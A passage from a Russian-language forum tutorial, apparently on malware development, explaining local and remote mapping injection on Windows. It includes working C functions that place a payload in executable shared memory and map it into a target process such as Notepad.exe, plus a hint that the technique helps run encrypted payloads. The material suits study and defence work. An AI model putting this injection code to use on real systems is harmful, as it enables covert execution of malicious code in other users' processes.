</ul><h3 class="bbHeading"><a class="u-anchorTarget" name="-funktsiya-localmapinject"></a>–§—É–Ω–∫—Ü–∏—è LocalMapInject&#8203;<a class="hoverLink" href="#-funktsiya-localmapinject" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>LocalMapInject ‚Äî —Ñ—É–Ω–∫—Ü–∏—è, –≤—ã–ø–æ–ª–Ω—è—é—â–∞—è –ª–æ–∫–∞–ª—å–Ω—É—é –∏–Ω—ä–µ–∫—Ü–∏—é –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏. –û–Ω–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç 3 –∞—Ä–≥—É–º–µ–Ω—Ç–∞:<br />
<ul>
<li data-xf-list-type="ul">pPayload ‚Äî –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.</li>
<li data-xf-list-type="ul">sPayloadSize ‚Äî —Ä–∞–∑–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.</li>
<li data-xf-list-type="ul">ppAddress ‚Äî —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ PVOID, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∞–µ—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏.</li>
</ul>–§—É–Ω–∫—Ü–∏—è –≤—ã–¥–µ–ª—è–µ—Ç –ª–æ–∫–∞–ª—å–Ω–æ –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º—ã–π –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π –±—É—Ñ–µ—Ä –∏ –∫–æ–ø–∏—Ä—É–µ—Ç –≤ —ç—Ç–æ—Ç –±—É—Ñ–µ—Ä –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –∑–∞—Ç–µ–º –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

    BOOL   bSTATE         = TRUE;
    HANDLE hFile          = NULL;
    PVOID  pMapAddress    = NULL;

    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if (hFile == NULL) {
        printf(&quot;[!] CreateFileMapping Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
    if (pMapAddress == NULL) {
        printf(&quot;[!] MapViewOfFile Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    memcpy(pMapAddress, pPayload, sPayloadSize);

_EndOfFunction:
    *ppAddress = pMapAddress;
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>UnmapViewOfFile</b><br />
<br />
UnmapViewOfFile ‚Äî —ç—Ç–æ WinAPI, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –¥–µ–∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —Ä–∞–Ω–µ–µ –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –¥–æ–ª–∂–Ω–∞ –≤—ã–∑—ã–≤–∞—Ç—å—Å—è —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ –Ω–µ –≤–æ –≤—Ä–µ–º—è –µ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. UnmapViewOfFile —Ç—Ä–µ–±—É–µ—Ç —Ç–æ–ª—å–∫–æ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞ –¥–ª—è –µ–≥–æ –¥–µ–∞–∫—Ç–∏–≤–∞—Ü–∏–∏.<br />
<br />
<b>–î–µ–º–æ</b><br />
<br />
–í—ã–¥–µ–ª–µ–Ω–∏–µ –±—É—Ñ–µ—Ä–∞ –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783393973.png"
		data-src="https://osint42.org/attachments/1746783393973-png.143/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783393973-png.143/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783393973.png"
			title="1746783393973.png"
			width="1567" height="768" loading="lazy" />
	</div><br />
<br />
–ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞–≥—Ä—É–∑–∫–∏<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783401440.png"
		data-src="https://osint42.org/attachments/1746783401440-png.144/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783401440-png.144/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783401440.png"
			title="1746783401440.png"
			width="1650" height="665" loading="lazy" />
	</div><br />
<br />
–ó–∞–ø—É—Å–∫, —á–µ—Ä–µ–∑ —Å–æ–∑–¥–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783408576.png"
		data-src="https://osint42.org/attachments/1746783408576-png.145/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783408576-png.145/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783408576.png"
			title="1746783408576.png"
			width="1454" height="801" loading="lazy" />
	</div><br />
<br />
<br />
<b>–£–¥–∞–ª–µ–Ω–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è —á–µ—Ä–µ–∑ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏</b><br />
<br />
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –æ–±—ä—è—Å–Ω—è—é—Ç—Å—è WinAPI, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–ª—è —É–¥–∞–ª–µ–Ω–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏. –®–∞–≥–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —É–¥–∞–ª–µ–Ω–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω—ã –Ω–∏–∂–µ.<br />
<ol>
<li data-xf-list-type="ol">–í—ã–∑—ã–≤–∞–µ—Ç—Å—è CreateFileMapping –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –æ–±—ä–µ–∫—Ç–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞.</li>
<li data-xf-list-type="ol">–ó–∞—Ç–µ–º –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è MapViewOfFile, —á—Ç–æ–±—ã –æ—Ç–æ–±—Ä–∞–∑–∏—Ç—å –æ–±—ä–µ–∫—Ç –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞ –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ol">–ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –ø–µ—Ä–µ–º–µ—â–∞–µ—Ç—Å—è –≤ –ª–æ–∫–∞–ª—å–Ω–æ –≤—ã–¥–µ–ª–µ–Ω–Ω—É—é –ø–∞–º—è—Ç—å.</li>
<li data-xf-list-type="ol">–ù–æ–≤–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–µ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∏—Å–ø–æ–ª—å–∑—É—è MapViewOfFile2, –æ—Ç–æ–±—Ä–∞–∂–∞—è –ª–æ–∫–∞–ª—å–Ω–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å, –∏ —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –Ω–∞—à—É —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–Ω—É—é –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É.</li>
</ol><b>MapViewOfFile2</b><br />
<br />
MapViewOfFile2 –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ, —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>PVOID MapViewOfFile2(
  [in]           HANDLE  FileMappingHandle,   // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –¥–ª—è –æ–±—ä–µ–∫—Ç–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞, –≤–æ–∑–≤—Ä–∞—â–µ–Ω–Ω–æ–≥–æ CreateFileMappingA/W
  [in]           HANDLE  ProcessHandle,       // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
  [in]           ULONG64 Offset,              // –ù–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è - NULL
  [in, optional] PVOID   BaseAddress,         // –ù–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è - NULL
  [in]           SIZE_T  ViewSize,            // –ù–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è - NULL
  [in]           ULONG   AllocationType,      // –ù–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è - NULL
  [in]           ULONG   PageProtection       // –ñ–µ–ª–∞–µ–º–∞—è –∑–∞—â–∏—Ç–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã.
);</code></pre>
	</div>
</div><ul>
<li data-xf-list-type="ul"><b>FileMappingHandle</b> - –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ä–∞–∑–¥–µ–ª–∞, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –æ—Ç–æ–±—Ä–∞–∂–µ–Ω –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ul"><b>ProcessHandle</b> - –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞, –≤ –∫–æ—Ç–æ—Ä–æ–º –±—É–¥–µ—Ç –æ—Ç–æ–±—Ä–∞–∂–µ–Ω —Ä–∞–∑–¥–µ–ª. –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –¥–æ–ª–∂–µ–Ω –∏–º–µ—Ç—å –º–∞—Å–∫—É –¥–æ—Å—Ç—É–ø–∞ PROCESS_VM_OPERATION.</li>
<li data-xf-list-type="ul"><b>PageProtection</b> - –∂–µ–ª–∞–µ–º–∞—è –∑–∞—â–∏—Ç–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã.</li>
</ul><b>–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ –ø–æ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏</b><br />
<br />
–í –æ—Ç–ª–∏—á–∏–µ –æ—Ç –ª–æ–∫–∞–ª—å–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏, –Ω–µ—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –¥–µ–ª–∞—Ç—å –ª–æ–∫–∞–ª—å–Ω–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º, —Ç–∞–∫ –∫–∞–∫ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ª–æ–∫–∞–ª—å–Ω–æ. –í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ MapViewOfFile –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ñ–ª–∞–≥ FILE_MAP_WRITE –¥–ª—è –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
MapViewOfFile2 –∑–∞—Ç–µ–º –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç —Ç–µ –∂–µ –±–∞–π—Ç—ã –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
MapViewOfFile2 –¥–µ–ª–∏—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞ —Å MapViewOfFile. –°–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –ª—é–±—ã–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ –ª–æ–∫–∞–ª—å–Ω–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–Ω–æ–º –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ –æ—Ç—Ä–∞–∂–∞—é—Ç—Å—è –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–Ω–æ–º –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ. –≠—Ç–æ –ø–æ–ª–µ–∑–Ω–æ –¥–ª—è —Ä–µ–∞–ª—å–Ω—ã—Ö —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–π, –≥–¥–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—É—é –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, —Ç–∞–∫ –∫–∞–∫ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∞ –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –∏ –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ, —Ç–µ–º —Å–∞–º—ã–º –¥–µ—à–∏—Ñ—Ä—É—è –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
<b>–§—É–Ω–∫—Ü–∏—è —É–¥–∞–ª–µ–Ω–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏</b><br />
<br />
RemoteMapInject - —ç—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç —É–¥–∞–ª–µ–Ω–Ω—É—é –∏–Ω—ä–µ–∫—Ü–∏—é —á–µ—Ä–µ–∑ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏. –û–Ω–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç 4 –∞—Ä–≥—É–º–µ–Ω—Ç–∞:<br />
<ul>
<li data-xf-list-type="ul"><b>hProcess</b> - –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ul"><b>pPayload</b> - –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.</li>
<li data-xf-list-type="ul"><b>sPayloadSize</b> - —Ä–∞–∑–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.</li>
<li data-xf-list-type="ul"><b>ppAddress</b> - —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ PVOID, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∞–µ—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–Ω–æ–π –ø–∞–º—è—Ç–∏.</li>
</ul>–§—É–Ω–∫—Ü–∏—è –≤—ã–¥–µ–ª—è–µ—Ç –ª–æ–∫–∞–ª—å–Ω–æ –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º—ã–π –±—É—Ñ–µ—Ä, –¥–æ—Å—Ç—É–ø–Ω—ã–π –¥–ª—è —á—Ç–µ–Ω–∏—è –∏ –∑–∞–ø–∏—Å–∏, –∑–∞—Ç–µ–º –∫–æ–ø–∏—Ä—É–µ—Ç –≤ –Ω–µ–≥–æ –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É. –ó–∞—Ç–µ–º –æ–Ω–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç MapViewOfFile2 –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ –Ω–æ–≤—ã–π —É–¥–∞–ª–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä –≤ —Ü–µ–ª–µ–≤–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –∏, –Ω–∞–∫–æ–Ω–µ—Ü, –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–Ω–æ–π –ø–∞–º—è—Ç–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

    BOOL        bSTATE            = TRUE;
    HANDLE      hFile             = NULL;
    PVOID       pMapLocalAddress  = NULL,
                pMapRemoteAddress = NULL;

    hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if (hFile == NULL) {
        printf(&quot;\t[!] CreateFileMapping Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
    if (pMapLocalAddress == NULL) {
        printf(&quot;\t[!] MapViewOfFile Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    memcpy(pMapLocalAddress, pPayload, sPayloadSize);

    pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
    if (pMapRemoteAddress == NULL) {
        printf(&quot;\t[!] MapViewOfFile2 Failed With Error : %d \n&quot;, GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf(&quot;\t[+] Remote Mapping Address : 0x%p \n&quot;, pMapRemoteAddress);

_EndOfFunction:
    *ppAddress = pMapRemoteAddress;
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>UnmapViewOfFile</b><br />
<br />
–ù–∞–ø–æ–º–Ω–∏–º, —á—Ç–æ UnmapViewOfFile —Ç—Ä–µ–±—É–µ—Ç —Ç–æ–ª—å–∫–æ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä—ã–π –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –¥–µ–∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω.<br />
–í—ã–∑–æ–≤ WinAPI UnmapViewOfFile –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∑–∞–ø—Ä–µ—â–µ–Ω, –∫–æ–≥–¥–∞ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –≤—Å–µ –µ—â–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è, –ø–æ—Ç–æ–º—É —á—Ç–æ —É–¥–∞–ª—ë–Ω–Ω–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ —è–≤–ª—è–µ—Ç—Å—è –æ—Ç—Ä–∞–∂–µ–Ω–∏–µ–º –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ.<br />
<b>–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –¥–µ–∞–∫—Ç–∏–≤–∞—Ü–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞ –≤—ã–∑–æ–≤–µ—Ç —Å–±–æ–π —É–¥–∞–ª—ë–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, —Ç–∞–∫ –∫–∞–∫ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –≤—Å–µ –µ—â–µ –∞–∫—Ç–∏–≤–Ω–∞.<br />
<br />
<b>–î–µ–º–æ</b> </b><br />
<br />
–¶–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å –¥–ª—è —ç—Ç–æ–π –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ ‚Äî Notepad.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783420331.png"
		data-src="https://osint42.org/attachments/1746783420331-png.146/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783420331-png.146/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783420331.png"
			title="1746783420331.png"
			width="1347" height="718" loading="lazy" />
	</div><br />
<br />
–ù–∏–∂–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–º –ø–æ–∫–∞–∑–∞–Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–Ω–∞—è –ø–∞–º—è—Ç—å, —Å–æ–¥–µ—Ä–∂–∞—â–∞—è –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –Ω–∞ –ø–∞–º—è—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã –∫–∞–∫ RW (—á—Ç–µ–Ω–∏–µ –∏ –∑–∞–ø–∏—Å—å).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783428572.png"
		data-src="https://osint42.org/attachments/1746783428572-png.147/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783428572-png.147/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783428572.png"
			title="1746783428572.png"
			width="1786" height="784" loading="lazy" />
	</div><br />
<br />
